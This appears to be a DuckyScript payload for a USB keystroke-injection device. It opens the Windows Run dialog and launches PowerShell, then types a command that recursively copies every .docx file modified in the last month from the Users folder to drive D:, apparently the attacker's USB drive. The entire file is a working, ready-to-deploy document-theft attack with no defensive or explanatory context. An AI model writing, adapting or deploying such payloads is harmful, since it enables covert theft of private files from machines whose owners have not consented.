DELAY 2000
REM Open Run dialog
GUI r
DELAY 500
REM Type PowerShell and press Enter
STRING powershell
ENTER
DELAY 1000
REM Execute PowerShell code
REM Launch new instance with C: drive
STRING Start-Process powershell -ArgumentList "-NoExit -Command Set-Location 'C:\';"
ENTER
DELAY 500
REM Execute remaining code in the new instance
STRING $sourceFolder = 'Users'; $destinationFolder = 'D:\'; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Force
ENTER
